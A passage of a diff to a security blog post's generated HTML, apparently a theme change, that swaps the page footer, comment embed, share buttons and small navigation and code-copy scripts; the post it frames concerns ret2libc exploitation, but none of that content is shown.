-                <span class="button__text">pwn&gt; scanf and hateful dot</span>
-            </a>
-        </span>
-        
-        
-        <span class="button next">
-            <a href="/posts/mitmproxy/">
-                <span class="button__text">!e MITM Proxy</span>
-                <span class="button__icon">→</span>
-            </a>
-        </span>
-        
-    </div>
-</div>
-
-  
-
-  
-
-<hr>
-<div id="disqus_thread"></div>
-<script type="application/javascript">
-    var disqus_config = function () {
-    
-    
-    
-    };
-    (function() {
-        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
-            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
-            return;
-        }
-        var d = document, s = d.createElement('script'); s.async = true;
-        s.src = '//' + "trib0r3s-blog" + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-
-
-</div>
 
   </div>
 
-  
-    <footer class="footer">
-  <div class="footer__inner">
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://rehex.ninja/tags/pwn/">pwn</a></li>
+      <li><a href="https://rehex.ninja/tags/linux/">linux</a></li>
+      <li><a href="https://rehex.ninja/tags/pwntools/">pwntools</a></li>
+      <li><a href="https://rehex.ninja/tags/note/">note</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://rehex.ninja/posts/scanf-and-hateful-dot/">
+    <span class="title">« Prev Page</span>
+    <br>
+    <span>pwn&gt; scanf and hateful dot</span>
+  </a>
+  <a class="next" href="https://rehex.ninja/posts/mitmproxy/">
+    <span class="title">Next Page »</span>
+    <br>
+    <span>!e MITM Proxy</span>
+  </a>
+</nav>
+
+
+<div class="share-buttons">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share pwn ret2libc by example on twitter"
+        href="https://twitter.com/intent/tweet/?text=pwn%3e%20ret2libc%20by%20example&amp;url=https%3a%2f%2frehex.ninja%2fposts%2fret2libc%2f&amp;hashtags=pwn%2clinux%2cpwntools%2cnote">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share pwn ret2libc by example on linkedin"
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2frehex.ninja%2fposts%2fret2libc%2f&amp;title=pwn%3e%20ret2libc%20by%20example&amp;summary=pwn%3e%20ret2libc%20by%20example&amp;source=https%3a%2f%2frehex.ninja%2fposts%2fret2libc%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share pwn ret2libc by example on reddit"
+        href="https://reddit.com/submit?url=https%3a%2f%2frehex.ninja%2fposts%2fret2libc%2f&title=pwn%3e%20ret2libc%20by%20example">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share pwn ret2libc by example on facebook"
+        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2frehex.ninja%2fposts%2fret2libc%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share pwn ret2libc by example on whatsapp"
+        href="https://api.whatsapp.com/send?text=pwn%3e%20ret2libc%20by%20example%20-%20https%3a%2f%2frehex.ninja%2fposts%2fret2libc%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share pwn ret2libc by example on telegram"
+        href="https://telegram.me/share/url?text=pwn%3e%20ret2libc%20by%20example&amp;url=https%3a%2f%2frehex.ninja%2fposts%2fret2libc%2f">
+        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28">
+            <path
+                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+        </svg>
+    </a>
+</div>
+
+  </footer>
+</article>
+    </main>
     
-      <div class="copyright copyright--user">
-        <span><a href="https://creativecommons.org/licenses/by/4.0/" target="_blank" rel="noopener">CC BY 4.0</a></span>
-    
-        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
-      </div>
-  </div>
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://rehex.ninja">reHex Ninja</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
+    </span>
 </footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
 
-<script src="/assets/main.js"></script>
-<script src="/assets/prism.js"></script>
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
 
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
 
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
 
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
 
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
 
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerText = 'copy';
 
+        function copyingDone() {
+            copybutton.innerText = 'copied!';
+            setTimeout(() => {
+                copybutton.innerText = 'copy';
+            }, 2000);
+        }
 
-  
-</div>
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
 
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
 </body>
+
 </html>
